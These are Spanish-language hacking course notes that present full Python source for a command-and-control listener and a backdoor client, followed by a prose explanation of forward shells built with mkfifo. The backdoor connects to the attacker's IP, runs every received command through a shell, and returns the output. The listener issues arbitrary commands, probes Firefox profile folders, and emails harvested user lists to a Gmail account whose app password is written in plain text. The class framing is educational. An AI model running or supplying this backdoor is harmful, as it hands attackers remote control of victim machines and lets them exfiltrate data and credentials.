> La creación y despliegue de backdoors y sistemas C&C es una actividad de hacking avanzada y altamente ilegal si se realiza sin autorización. Este contenido es estrictamente educativo y debe ser practicado únicamente en entornos de laboratorio controlados y con el consentimiento explícito de todas las partes involucradas. El uso indebido de estas técnicas puede acarrear graves consecuencias legales.

### Listener.py

```python
#!/usr/bin/env python3

import tempfile # Módulo para crear archivos y directorios temporales (no usado en este listener, pero común en malware).
import socket # Módulo para la programación de red (sockets).
import signal # Módulo para manejar señales del sistema.
import sys # Módulo para interactuar con el sistema.
from termcolor import colored # Para añadir color a la salida de la consola.
from email.mime.text import MIMEText # Para crear mensajes de correo electrónico.
import smtplib # Para enviar correos electrónicos.
import re # Módulo para expresiones regulares (no usado directamente en este listener, pero común en análisis de datos).


def def_handler(sig, frame):
    print(colored(f"\n\n[!] Saliendo.......", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)


class Listener:

    def __init__(self, ip, port):

        self.options = {"get users": "List System Valid users (Gmail)", "help": "Show help panel", "firefox info": "firefox decrypted info (Gmail)"}
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Crea un socket de servidor TCP/IPv4.
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Permite reutilizar la dirección y el puerto inmediatamente después de cerrar el socket.
        server_socket.bind((ip, port)) # Asocia el socket a la dirección IP y puerto especificados.
        server_socket.listen() # Pone el socket en modo de escucha para conexiones entrantes.

        print(colored(f"[+] En espera de conexiones en {ip}:{port}: ", 'blue'))
        self.clientent_socket, client_addres = server_socket.accept() # Acepta una conexión entrante, devolviendo un nuevo socket para la comunicación con el cliente y su dirección.
        print(colored(f"\n[+] Conexión establecida con {client_addres}\n", 'green'))

    def execute_remote(self, command):
        self.clientent_socket.send(command.encode()) # Envía el comando codificado al cliente.

        return self.clientent_socket.recv(6144).decode() # Recibe la respuesta del cliente (hasta 6144 bytes) y la decodifica.

    def get_users(self):
        self.clientent_socket.send(b"net user") # Envía el comando 'net user' al cliente para listar usuarios.
        output_command = self.clientent_socket.recv(6144).decode() # Recibe la salida del comando.
        self.send_email("Users List Info", output_command, "starkhacking21@gmail.com", ["starkhacking21@gmail.com"], "q m m p a q r e p q v m o k h v") # Envía la lista de usuarios por correo electrónico.


    def send_email(self, subject, body, sender,recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)


        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())

        print(f"\n[+] Email sent Successfully!\n")

    def show_help(self):
        for key, value in self.options.items():
            print(f"{key} = {value}\n")

    def firefox_passwords(self, username):
        # Envía un comando para listar el contenido del directorio de perfiles de Firefox del usuario.
        self.clientent_socket.send(f"dir C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles".encode())
        output_command = self.clientent_socket.recv(2048).decode()

        print(output_command)

    def run(self):

        while True:
            command = input(colored(">> ", 'blue'))

            if command == "get users":
                self.get_users()
            elif command == "help":
                self.show_help()

            elif command == "firefox info":
                user = input("Digite el username: ")
                self.firefox_passwords(user)

            else:
                command_output = self.execute_remote(command)
                print(command_output)


def main():
    my_listener = Listener("192.168.1.109", 443) # Instancia el Listener con la IP y puerto del atacante.
    my_listener.run()

if __name__ == "__main__":
    main()
```

### backdor.py:

```python

#!/usr/bin/env python3 # Corregido 'evn' a 'env'
import socket # Módulo para la programación de red (sockets).
import subprocess # Módulo para ejecutar comandos del sistema operativo.

def run_command(command):

    command_output = subprocess.check_output(command, shell=True) # Ejecuta el comando en un shell y captura su salida.

    return command_output.decode("cp850").strip() # Decodifica la salida usando cp850 (común en Windows) y elimina espacios en blanco.

  
def main():

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Crea un socket de cliente TCP/IPv4.
    client_socket.connect(("192.168.1.109", 443)) # Intenta conectar al servidor C&C (IP y puerto del atacante).

    while True:

      try:
        command = client_socket.recv(2048).decode().strip() # Recibe un comando del servidor (hasta 2048 bytes) y lo decodifica.
        command_output = run_command(command).encode() # Ejecuta el comando recibido y codifica la salida.
        client_socket.send(b"\n" + command_output + b"\n") # Envía la salida del comando de vuelta al servidor, con saltos de línea para formato.

      except Exception as e:
        client_socket.send(b"[!] Command not found.....") # En caso de error al ejecutar el comando, envía un mensaje de error al servidor.

    client_socket.close() # Cierra el socket del cliente (aunque el bucle 'while True' lo hace inalcanzable en la práctica sin un mecanismo de salida).

if __name__ == "__main__":

    main()
```

## **Creación de Forward Shell**

En esta clase, nos centraremos en la creación de una **Forward Shell**, una solución alternativa cuando las opciones más comunes, como las reverse shells, no son viables debido a restricciones como las reglas de firewall.

La Forward Shell es una técnica ingeniosa que se utiliza en situaciones donde, a pesar de tener acceso a un sistema a través de una webshell u otro método, no podemos establecer una reverse shell debido a las restricciones impuestas por el firewall del sistema objetivo. En estos casos, la Forward Shell nos permite ejecutar comandos y obtener una shell interactiva utilizando métodos alternativos que no requieren establecer una conexión TCP directa con el sistema de la forma tradicional.

Una de las claves de esta técnica es el uso de **mkfifo**, una herramienta para crear named pipes (tuberías con nombre) en sistemas Unix/Linux. Mediante estas tuberías, podemos establecer una comunicación bidireccional entre la máquina atacante y la máquina objetivo, permitiendo una interacción más fluida y completa con la shell del sistema comprometido. Esto nos brinda una mayor movilidad y flexibilidad para operar, incluso en entornos restringidos.

En esta clase, te enseñaremos cómo implementar esta técnica, desde la configuración inicial hasta la ejecución práctica, proporcionando una alternativa valiosa para obtener acceso interactivo a sistemas protegidos por firewalls estrictos. Al finalizar, tendrás una comprensión profunda de cómo se pueden utilizar las Forward Shells en escenarios donde las técnicas convencionales de shell inversa no son posibles.

> [!info]
> Una **Forward Shell** es útil cuando el atacante no puede iniciar una conexión directa a la máquina víctima (ej. debido a un firewall restrictivo), pero la víctima puede iniciar una conexión al atacante (como en una webshell). En lugar de una conexión directa de shell, se utilizan mecanismos como `mkfifo` (named pipes) en la víctima para redirigir la entrada/salida de un shell a través de una conexión HTTP/HTTPS existente o un canal de comunicación limitado, permitiendo al atacante enviar comandos y recibir su salida de forma interactiva.

```python

```